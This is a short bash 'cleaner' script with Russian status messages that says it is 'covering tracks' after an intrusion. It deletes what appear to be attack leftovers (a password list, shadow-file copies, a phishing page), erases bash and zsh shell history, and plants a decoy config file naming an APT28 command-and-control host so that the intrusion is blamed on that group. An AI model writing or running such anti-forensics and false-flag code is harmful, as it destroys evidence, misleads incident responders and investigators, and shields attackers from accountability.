#!/bin/bash
echo "[CLEANER] Заметаю следы..."
rm -f /tmp/.shadow_* /tmp/passlist.txt /tmp/cham_page.html 2>/dev/null
rm -f ~/.bash_history ~/.zsh_history 2>/dev/null
history -c 2>/dev/null
mkdir -p /tmp/.apt_decoy
echo "C2: apt28-c2.darknet.local" > /tmp/.apt_decoy/config
echo "[CLEANER] Мы исчезли, APT28 осталась"
